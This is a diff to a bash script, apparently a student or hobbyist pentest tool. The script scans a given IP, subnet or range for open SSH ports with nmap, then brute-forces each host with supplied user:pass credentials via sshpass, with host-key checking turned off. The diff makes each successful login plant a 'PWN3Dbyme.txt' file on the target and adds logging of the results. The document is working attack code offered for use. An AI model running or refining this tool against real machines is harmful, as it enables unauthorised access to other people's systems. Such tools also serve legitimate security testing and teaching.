@@ -1,6 +1,22 @@
 #!/bin/bash
 targets_array=()
 credentials_array=()
+action_logs=()
+
+action_logger() {
+    local message="$1"
+    action_logs+=("$message")
+    printf "%s\n" "$message"
+}
+
+check_sshpass() {
+    if ! command -v sshpass >/dev/null 2>&1; then
+        printf "Error: sshpass is not installed.\n"
+        printf "Please install it with \"sudo apt install sshpass\" to use this tool.\n"
+        return 1
+    fi
+    return 0
+}
 
 brute_ssh() {
     local target="$1"
@@ -17,22 +33,28 @@ brute_ssh() {
     printf 'pass=%s\n' "$password"
 
     printf "Trying $username@$target with password: $password\n"
+    echo
 
-    remote_cmd='touch "$HOME/Desktop/.Iwashere"; echo "created Iwashere on $HOME/Desktop/.Iwashere"'
-    if sshpass -p "$password" ssh \
+    remote_cmd='current_dir=$(pwd); touch "$current_dir/PWN3Dbyme.txt" && test -f "$current_dir/PWN3Dbyme.txt" && echo "$current_dir/PWN3Dbyme.txt"'
+    ssh_exec=$(sshpass -p "$password" ssh \
         -p 22 \
         -o StrictHostKeyChecking=no \
-        -o UserknownHostsFile=/dev/null \
+        -o UserKnownHostsFile=/dev/null \
         -o ConnectTimeout=5 \
         -o PreferredAuthentications=password \
         -o PubkeyAuthentication=no \
         -o NumberOfPasswordPrompts=1 \
-        "$username@$target" "exit" >/dev/null 2>&1
+        "$username@$target" "$remote_cmd" 2>/dev/null)
+    
+    if [[ $? -eq 0 ]]; 
     then
-        printf 'SUCCESS! Login worked for %s@%s\n' "$username" "$target"
+        action_logger "SUCCESS! $username@$target created $ssh_exec"
+        printf "Created file at: %s\n" "$ssh_exec"
+        echo
         return 0
     else
-        printf 'FAILED! Login failed for %s@%s\n' "$username" "$target"
+        action_logger "FAILED! Login failed for $username@$target"
+        echo
         return 1
     fi
 }
@@ -193,7 +215,9 @@ read -r -p "Please Enter target IP or subnet (Ex: 192.168.1.1 or 192.168.1.0/24 
 
 if is_it_valid_CIDR "$target_range"; then
     printf "Valid CIDR subnet!\n"
+    sleep 1
     printf "Scanning for open ssh ports...\n"
+    sleep 1
     if ! nmap_scan "$target_range"; then
         printf "No open ports were found...\n"
         exit 1
@@ -202,9 +226,13 @@ if is_it_valid_CIDR "$target_range"; then
         printf -- "--------------------------------------\n"
         printf '%s\n' "${targets_array[@]}"
         echo
-        read -r -p "Please Provide a single Credential for ssh, or a file as user:pass:" credentials
+        read -r -p "Please Provide a single Credential for ssh, or a file as user:pass :" credentials
         if ! file_or_cred_check "$credentials"; then
             printf "Invalid credential input\n"
+            exit 1
+        fi
+
+        if ! check_sshpass; then
             exit 1
         fi
 
@@ -214,9 +242,12 @@ if is_it_valid_CIDR "$target_range"; then
             done
         done
     fi
+
 elif is_it_valid_ip "$target_range"; then
     printf "Valid IP address!\n"
+    sleep 1
     printf "Scanning for open ssh ports...\n"
+    sleep 1
     if ! nmap_scan "$target_range"; then
         printf "No open ports were found...\n"
         exit 1
@@ -224,11 +255,16 @@ elif is_it_valid_ip "$target_range"; then
         printf "Open Ports were found on these IP addresses\n"
         printf -- "--------------------------------------\n"
         printf '%s\n' "${targets_array[@]}"
-        read -r -p "Please Provide a single Credential for ssh, or a file as user:pass:" credentials
+        read -r -p "Please Provide a single Credential for ssh, or a file as user:pass :" credentials
         if ! file_or_cred_check "$credentials"; then
             printf "Invalid credential input\n"
             exit 1
         fi
+
+        if ! check_sshpass; then
+            exit 1
+        fi
+
         for target in "${targets_array[@]}"; do
             for credential in "${credentials_array[@]}"; do
                 brute_ssh "$target" "$credential"
@@ -237,7 +273,9 @@ elif is_it_valid_ip "$target_range"; then
     fi 
 elif is_it_valid_range "$target_range"; then
     printf "great success!\n"
+    sleep 1
     printf "Scanning for open ssh ports...\n"
+    sleep 1
     if ! nmap_scan "$target_range"; then
         printf "No open ports were found...\n"
         exit 1
@@ -245,11 +283,16 @@ elif is_it_valid_range "$target_range"; then
         printf "Open Ports were found on these IP addresses\n"
         printf -- "--------------------------------------\n"
         printf '%s\n' "${targets_array[@]}"
-        read -r -p "Please Provide a single Credential for ssh, or a file as user:pass:" credentials
+        read -r -p "Please Provide a single Credential for ssh, or a file as user:pass :" credentials
         if ! file_or_cred_check "$credentials"; then
             printf "Invalid credential input\n"
             exit 1
         fi
+
+        if ! check_sshpass; then
+            exit 1
+        fi
+
         for target in "${targets_array[@]}"; do
             for credential in "${credentials_array[@]}"; do
                 brute_ssh "$target" "$credential"
@@ -259,3 +302,16 @@ elif is_it_valid_range "$target_range"; then
 else
     printf "Invalid input\n"
 fi
+
+read -r -p "Would you like to save the action log to a file? (y/N): " save_this
+
+case "$save_this" in
+    y|Y|yes|Yes|YES)
+        read -r -p "enter output filename: " output_name
+        printf "%s\n" "${action_logs[@]}" > $output_name
+        printf "Action log saved to %s\n" "$output_name"
+        ;;
+    *)
+        printf "Log was not saved. \n"
+        ;;
+esac
